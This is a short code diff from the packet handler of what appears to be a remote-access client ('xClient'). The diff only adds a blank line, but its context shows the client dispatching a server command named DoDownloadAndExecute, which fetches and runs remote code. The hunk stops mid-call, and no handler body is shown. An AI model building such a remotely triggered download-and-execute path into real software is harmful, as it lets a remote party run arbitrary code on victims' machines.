@@ -9,6 +9,7 @@ namespace xClient.Core.Packets
         public static void HandlePacket(Client client, IPacket packet)
         {
             var type = packet.GetType();
+
             if (type == typeof(ServerPackets.DoDownloadAndExecute))
             {
                 CommandHandler.HandleDoDownloadAndExecute((ServerPackets.DoDownloadAndExecute)packet,
